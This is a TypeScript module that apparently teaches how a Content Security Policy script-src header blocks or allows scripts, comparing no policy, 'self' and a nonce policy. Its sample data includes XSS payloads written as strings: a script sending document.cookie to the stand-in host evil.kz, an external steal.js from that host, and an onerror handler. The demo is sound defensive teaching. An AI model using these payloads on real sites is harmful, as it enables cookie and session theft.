/**
 * Content Security Policy: a page with two scripts of its own and three that
 * an attacker managed to inject (XSS). The browser decides which run under
 * each policy. A simplified but faithful reading of script-src.
 */

export interface PageScript {
  id: string;
  label: string;
  kind: "external" | "inline" | "handler";
  src?: string;
  nonce?: string;
  legit: boolean;
}

export const PAGE_SCRIPTS: PageScript[] = [
  { id: "app", label: "<script src=\"/app.js\">", kind: "external", src: "/app.js", legit: true },
  { id: "boot", label: "<script nonce=\"r4nd0m\"> сайттың өз inline коды", kind: "inline", nonce: "r4nd0m", legit: true },
  { id: "xss-inline", label: "<script>fetch('evil.kz?c='+document.cookie)</script>", kind: "inline", legit: false },
  { id: "xss-handler", label: "<img src=x onerror=\"steal()\">", kind: "handler", legit: false },
  { id: "xss-external", label: "<script src=\"https://evil.kz/steal.js\">", kind: "external", src: "https://evil.kz/steal.js", legit: false },
];

export type Policy = "none" | "self" | "nonce";
export const POLICY_HEADER: Record<Policy, string> = {
  none: "(CSP жоқ)",
  self: "Content-Security-Policy: script-src 'self'",
  nonce: "Content-Security-Policy: script-src 'self' 'nonce-r4nd0m'",
};

export function allowed(p: PageScript, policy: Policy): boolean {
  if (policy === "none") return true;
  if (p.kind === "handler") return false; // inline event handlers need 'unsafe-inline'
  if (p.kind === "external") return !!p.src && p.src.startsWith("/"); // 'self': same origin only
  return policy === "nonce" && p.nonce === "r4nd0m";
}

export function evaluateCsp(policy: Policy): { ran: string[]; attacks: number; brokenLegit: number } {
  const ran = PAGE_SCRIPTS.filter((s) => allowed(s, policy)).map((s) => s.id);
  return {
    ran,
    attacks: PAGE_SCRIPTS.filter((s) => !s.legit && ran.includes(s.id)).length,
    brokenLegit: PAGE_SCRIPTS.filter((s) => s.legit && !ran.includes(s.id)).length,
  };
}
